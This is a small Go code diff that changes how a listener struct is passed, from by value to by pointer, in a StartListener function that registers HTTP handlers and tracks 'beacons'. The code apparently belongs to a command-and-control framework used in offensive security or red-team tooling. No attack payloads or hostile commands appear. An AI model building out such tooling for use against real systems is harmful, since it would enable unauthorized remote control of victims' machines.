@@ -15,7 +15,7 @@ func StartListener(uri string, port int, lisname string) {
 		ReadXML("./Listener/"+lisname+".xml", &listener)
 
 		http.HandleFunc("/"+strings.TrimPrefix(listener.Uri, "IGOR-"), func(w http.ResponseWriter, r *http.Request) {
-			Listener_Handler(w, r, listener)
+			Listener_Handler(w, r, &listener)
 		})
 
 		fmt.Printf("Listening on port %d: %s...\n", port, listener.Lisname)
@@ -33,10 +33,10 @@ func StartListener(uri string, port int, lisname string) {
 			Beacons: beacons,
 		}
 
-		saveXML("./Listener/"+lisname, listener)
+		saveXML("./Listener/"+lisname, &listener)
 
 		http.HandleFunc("/"+uri, func(w http.ResponseWriter, r *http.Request) {
-			Listener_Handler(w, r, listener)
+			Listener_Handler(w, r, &listener)
 		})
 
 		fmt.Printf("Listening on port %d...\n", port)
